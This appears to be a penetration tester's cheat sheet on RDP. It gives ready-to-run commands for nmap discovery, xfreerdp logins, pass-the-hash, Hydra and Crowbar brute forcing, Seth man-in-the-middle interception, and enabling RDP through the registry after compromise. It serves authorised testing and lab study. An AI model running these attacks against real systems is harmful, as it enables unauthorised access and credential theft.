# RDP
```table-of-contents
```
## Discovery & Enumeration
```shell
# Nmap - Discovery & Version
# Identifies OS, Hostname, and Domain info
nmap -p 3389 -sC -sV <IP>

# Nmap - Check for Known Vulnerabilities (BlueKeep / SMBGhost)
nmap -p 3389 --script "rdp-vuln*" <IP>

# Nmap - Check Encryption Capabilities
nmap -p 3389 --script rdp-enum-encryption <IP>
```
### RDP Security Check (Perl Tool)
```shell
# Clone and Run
# git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl <IP>
```
## Connection (xfreerdp)
```shell
# Standard Connection
# /u: User | /p: Password | /v: Target
# /dynamic-resolution: Adjusts window size automatically
xfreerdp /u:<USER> /p:<PASSWORD> /v:<IP> /dynamic-resolution

# Certificate Error Bypass
# If you get certificate errors, use /cert:ignore
xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore

# Drive Sharing (File Upload/Download)
# Mounts your local '/home/kali' to the remote machine
xfreerdp /u:<USER> /p:<PASS> /v:<IP> /drive:share,/home/kali
```
## Attacks
### 1. Pass-The-Hash (Restricted Admin Mode)
```shell
# /pth: NTLM Hash
xfreerdp /u:<USER> /pth:<NTLM_HASH> /v:<IP>
```
### 2. Brute Force
```shell
# Hydra
hydra -L users.txt -P passwords.txt rdp://<IP>

# Crowbar (Recommended for RDP)
# Supports NLA (Network Level Authentication) which Hydra sometimes fails at
crowbar -b rdp -s <IP>/32 -U users.txt -C passwords.txt
```
### 3. Man-in-the-Middle (Seth)
- [Seth](https://github.com/SySS-Research/Seth)
```shell
# ./seth.sh <INTERFACE> <ATTACKER_IP> <GATEWAY_IP> <TARGET_IP>
./seth.sh eth0 10.10.14.5 10.10.10.1 10.10.10.50
```
## Post-Exploitation (Local)
```powershell
:: Enable RDP via Registry (from a shell)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: Check who is logged in via RDP
qwinsta
```